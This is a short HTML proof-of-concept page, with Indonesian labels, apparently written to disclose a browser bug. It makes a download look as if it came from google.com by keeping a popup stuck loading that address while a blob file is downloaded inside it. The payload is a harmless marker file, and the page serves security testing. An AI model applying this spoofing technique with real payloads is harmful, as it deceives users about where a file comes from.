<meta charset="utf-8"><title>06 download attribution</title>
<h3>06 &mdash; atribusi sumber unduhan saat bar menggantung</h3>
<button onclick="run()">Run 06</button>
<pre id="p"></pre>
<script>
var T = 'https://www.google.com:9090/';
document.getElementById('p').textContent =
  'REAL origin : ' + location.origin + '\nREAL href   : ' + location.href;
function run(){
  var w = window.open('', '', 'width=480,height=620,left=200,top=120');
  w.document.write('<h3>Dokumen ini milik ' + location.origin + '</h3>');
  setInterval(function(){ w.location.replace(T); }, 9800);
  setTimeout(function(){
    var b = new Blob(['PoC marker. Byte ini dibuat oleh ' + location.origin], {type:'text/plain'});
    var a = w.document.createElement('a');
    a.href = URL.createObjectURL(b); a.download = 'dia-poc-marker.txt';
    w.document.body.appendChild(a); a.click();
  }, 1200);
}
</script>
